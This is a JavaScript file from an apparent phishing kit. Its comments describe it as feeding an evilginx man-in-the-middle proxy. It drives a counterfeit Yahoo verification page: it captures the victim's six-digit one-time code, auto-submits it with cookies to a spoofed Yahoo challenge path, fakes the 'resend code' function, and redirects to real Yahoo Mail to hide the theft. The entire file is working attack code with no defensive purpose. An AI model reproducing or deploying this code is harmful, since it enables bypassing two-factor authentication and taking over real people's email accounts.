// Yahoo OTP Input Page - Complete MITM Integration
;(() => {
  // Auto-format OTP input
  function setupOTPFormatting() {
    const otpInput = document.getElementById("verifyCode")

    otpInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, "")
      if (value.length > 6) {
        value = value.substring(0, 6)
      }
      e.target.value = value

      // Auto-submit when 6 digits entered
      if (value.length === 6) {
        setTimeout(() => {
          document.getElementById("otpForm").dispatchEvent(new Event("submit"))
        }, 500)
      }
    })

    // Only allow numbers
    otpInput.addEventListener("keypress", (e) => {
      if (!/\d/.test(e.key) && !["Backspace", "Delete", "Tab", "Enter"].includes(e.key)) {
        e.preventDefault()
      }
    })
  }

  // Form submission with MITM data capture
  function setupFormSubmission() {
    const form = document.getElementById("otpForm")
    const submitBtn = document.getElementById("submitBtn")
    const btnText = document.getElementById("btnText")
    const btnSpinner = document.getElementById("btnSpinner")
    const errorMessage = document.getElementById("errorMessage")

    form.addEventListener("submit", async (e) => {
      e.preventDefault()

      const otpCode = document.getElementById("verifyCode").value

      if (otpCode.length !== 6) {
        errorMessage.textContent = "Please enter a 6-digit verification code."
        errorMessage.style.display = "block"
        return
      }

      // Show loading state
      submitBtn.disabled = true
      btnText.style.display = "none"
      btnSpinner.style.display = "inline-block"
      errorMessage.style.display = "none"

      // Collect form data
      const formData = new FormData(form)
      formData.append("otp_code", otpCode)
      formData.append("page_source", "custom_otp_input")
      formData.append("timestamp", Date.now())

      try {
        // Submit to evilginx for MITM capture
        const response = await fetch(window.location.origin + "/account/challenge/email-verify", {
          method: "POST",
          body: formData,
          credentials: "include",
          headers: {
            "X-Requested-With": "XMLHttpRequest",
            Accept: "application/json, text/plain, */*",
          },
        })

        if (response.ok) {
          // Show success state
          btnText.textContent = "Success!"
          btnText.style.display = "inline"
          btnSpinner.style.display = "none"

          // Redirect to success page or original Yahoo
          setTimeout(() => {
            window.location.href = "https://mail.yahoo.com"
          }, 1000)
        } else {
          throw new Error("Verification failed")
        }
      } catch (error) {
        // Show error message
        errorMessage.textContent = "Invalid verification code. Please try again."
        errorMessage.style.display = "block"

        // Reset button state
        submitBtn.disabled = false
        btnText.style.display = "inline"
        btnSpinner.style.display = "none"

        // Clear and focus OTP field
        document.getElementById("verifyCode").value = ""
        document.getElementById("verifyCode").focus()
      }
    })
  }

  // Resend code functionality
  function setupResendCode() {
    const resendLink = document.getElementById("resendCode")

    resendLink.addEventListener("click", function (e) {
      e.preventDefault()

      // Simulate resend request
      this.textContent = "Sending..."
      this.style.pointerEvents = "none"

      setTimeout(() => {
        this.textContent = "Code sent! Check your device."
        setTimeout(() => {
          this.textContent = "Didn't get a code?"
          this.style.pointerEvents = "auto"
        }, 3000)
      }, 1500)
    })
  }

  // Initialize page
  document.addEventListener("DOMContentLoaded", () => {
    setupOTPFormatting()
    setupFormSubmission()
    setupResendCode()

    // Auto-focus OTP input with delay
    setTimeout(() => {
      document.getElementById("verifyCode").focus()
    }, 300)
  })
})()
